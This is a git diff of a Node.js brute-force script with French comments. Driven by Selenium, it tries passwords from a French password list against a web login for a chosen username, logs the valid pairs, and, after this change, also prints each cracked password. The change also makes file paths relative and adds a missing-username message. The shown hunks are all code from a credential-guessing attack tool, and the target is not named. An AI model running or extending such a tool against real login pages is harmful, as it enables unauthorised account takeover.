@@ -5,7 +5,7 @@ const fs = require('fs')
 
 // Ecrit une ligne dans le fichier logs
 const log = (str = '') => {
-    fs.appendFileSync('./logs', str + '\n', { encoding: 'utf-8' })
+    fs.appendFileSync(__dirname + '/logs', str + '\n', { encoding: 'utf-8' })
 }
 
 program.option('-u, --username <username>', "Nom de l'utilisateur")
@@ -20,7 +20,7 @@ if (program.username) {
         try {
             log('-- Démarrage de la capture --')
 
-            const fileStream = fs.createReadStream('french_passwords.txt')
+            const fileStream = fs.createReadStream(__dirname + '/../french_passwords.txt')
 
             const rl = readline.createInterface({
                 input: fileStream,
@@ -42,6 +42,7 @@ if (program.username) {
                     const greetings = await driver.wait(until.elementLocated(By.id('greetings')), 100)
                     log(`${Date.now()} >> Couple valide ${username} -> ${password}`)
 
+                    console.log(password)
                     // Déconnexion
                     await driver.findElement(By.name('deconnexion')).sendKeys(Key.ENTER)
                 } catch (e) {
@@ -54,4 +55,6 @@ if (program.username) {
             driver.quit()
         }
     })()
+} else {
+    console.log("Vous devez spécifier un nom d'utilisateur")
 }
